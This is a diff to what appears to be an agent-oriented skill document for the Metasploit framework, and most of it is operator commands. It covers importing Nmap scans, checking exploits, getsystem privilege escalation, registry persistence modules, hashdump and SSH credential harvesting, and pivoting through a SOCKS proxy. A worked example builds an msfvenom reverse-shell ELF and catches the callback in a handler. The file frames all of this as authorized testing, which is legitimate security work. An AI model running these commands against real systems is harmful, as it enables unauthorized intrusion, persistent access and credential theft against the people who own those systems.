@@ -8,8 +8,9 @@ license: Apache-2.0
 compatibility: 'Linux (Kali), macOS, Docker'
 metadata:
   author: terminal-skills
-  version: 1.0.0
+  version: 1.1.0
   category: devops
+  repository: https://github.com/rapid7/metasploit-framework
   tags:
     - metasploit
     - exploitation
@@ -22,7 +23,7 @@ metadata:
 
 ## Overview
 
-Metasploit is the world's most used penetration testing framework. It contains 2,000+ exploits, 500+ payloads, and extensive post-exploitation modules. Use it to validate vulnerabilities found during scanning, demonstrate impact, establish persistent access, and pivot through networks. Integrates with Nmap output for seamless workflow.
+Metasploit is the world's most used penetration testing framework. It contains thousands of exploits, hundreds of payloads, and extensive post-exploitation modules. Use it to validate vulnerabilities found during scanning, demonstrate impact, establish persistent access, and pivot through networks. Integrates with Nmap output for seamless workflow. Framework 6.5 (July 2026) added malleable C2 profiles for Meterpreter and expanded NTLM-relay support; Rapid7 also ships `msfmcpd`, a separate MCP server that exposes Metasploit data to AI agents.
 
 ## Instructions
 
@@ -33,8 +34,10 @@ Metasploit is the world's most used penetration testing framework. It contains 2
 msfdb init
 msfconsole
 
-# Inside msfconsole:
-# Import Nmap scan results
+# Inside msfconsole, confirm the database connected
+msf6> db_status
+
+# Import Nmap scan results (nmap -oX scan-results.xml <target> first)
 msf6> db_import scan-results.xml
 msf6> hosts            # list discovered hosts
 msf6> services         # list discovered services
@@ -98,11 +101,16 @@ meterpreter> getsystem              # attempt local privilege escalation
 meterpreter> run post/multi/recon/local_exploit_suggester
 # Suggests kernel exploits for the target OS
 
-# Persistence (authorized testing only)
-meterpreter> run persistence -U -i 60 -p 4444 -r 192.168.1.50
+# Persistence (authorized testing only) — the old `run persistence` Meterpreter
+# script was removed; use one of the exploit/windows/persistence/* modules
+# against the existing session instead, e.g.:
+meterpreter> background
+msf6> use exploit/windows/persistence/registry
+msf6> set SESSION 1
+msf6> run
 
 # Credential harvesting
-meterpreter> hashdump               # dump password hashes (needs SYSTEM)
+meterpreter> hashdump               # dump password hashes (needs SYSTEM, Windows only)
 meterpreter> run post/linux/gather/hashdump
 meterpreter> run post/multi/gather/ssh_creds
 ```
@@ -116,6 +124,7 @@ msf6> route add 10.0.0.0/24 1      # session 1 as gateway
 # Use SOCKS proxy for tools that can't route through Meterpreter
 msf6> use auxiliary/server/socks_proxy
 msf6> set SRVPORT 1080
+msf6> set VERSION 5          # SOCKS5; use 4a for older clients
 msf6> run -j
 
 # Now use proxychains with any tool
@@ -166,14 +175,34 @@ msf6> set LPORT 4444
 msf6> exploit -j       # run in background
 ```
 
+## Examples
+
+### Example 1: "Validate the Apache CVE our scanner flagged on 192.168.1.100 is actually exploitable"
+
+Import the authorized engagement's Nmap results, confirm the service, then run `check` (not
+`exploit`) first: `db_import scan-results.xml`, `use exploit/multi/http/apache_mod_cgi_bash_env_exec`,
+`set RHOSTS 192.168.1.100`, `set TARGETURI /cgi-bin/status`, `check`. Result: msfconsole prints
+`[+] 192.168.1.100:80 - The target is vulnerable.` or `[-] ... is not vulnerable.` without ever
+sending a payload — that's the basis for deciding whether to run `exploit` at all.
+
+### Example 2: "Generate a Linux reverse-shell payload and catch the callback"
+
+`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell.elf`
+builds the binary; before delivering it, start the matching listener with
+`use exploit/multi/handler`, `set PAYLOAD linux/x64/meterpreter/reverse_tcp`, `set LHOST 0.0.0.0`,
+`set LPORT 4444`, `exploit -j`. Result: once `shell.elf` runs on an authorized target, the handler
+prints `[*] Meterpreter session 1 opened` and you get an interactive `meterpreter>` prompt.
+
 ## Guidelines
 
 - **Written authorization is mandatory.** Metasploit contains real exploits — unauthorized use is a criminal offense.
 - Always `check` before `exploit` — confirms vulnerability without triggering the payload.
-- Use `db_import` with Nmap XML to build a target database — then `services` and `vulns` guide your exploit selection.
+- Use `db_import` with Nmap XML (generated via `nmap -oX`) to build a target database — then `services` and `vulns` guide your exploit selection. `db_nmap` runs Nmap from inside msfconsole and skips the import step entirely.
 - Meterpreter is a stealthy, in-memory payload. Prefer it over raw shells for post-exploitation.
-- Document every action. Metasploit logs to `~/.msf4/logs/` — supplement with screenshots.
+- Document every action. Metasploit logs to `~/.msf4/logs/framework.log` (raise verbosity with `setg LogLevel 3`) — supplement with screenshots.
 - Pivoting via `route add` + SOCKS proxy lets you reach internal networks from your workstation.
 - `exploit -j` runs exploits as background jobs — handle multiple sessions simultaneously.
 - msfvenom payloads need a matching handler. Always start the handler before delivering the payload.
+- Meterpreter scripts (`run <script>`) are legacy; most are deprecated or removed. There is no `post/windows/manage/persistence_exe` module — the old `run persistence` script's replacement is one of the `exploit/windows/persistence/*` modules (e.g. `registry`, `startup_folder`) run with `set SESSION <id>` against the existing session.
 - Clean up after testing: remove persistence, uploaded files, and port forwards.
+- Rapid7 ships `msfmcpd`, an MCP server for Metasploit, so an AI agent can query hosts/services/exploits through the Model Context Protocol instead of parsing msfconsole output — useful context if you're wiring this skill into an agent rather than running commands by hand.
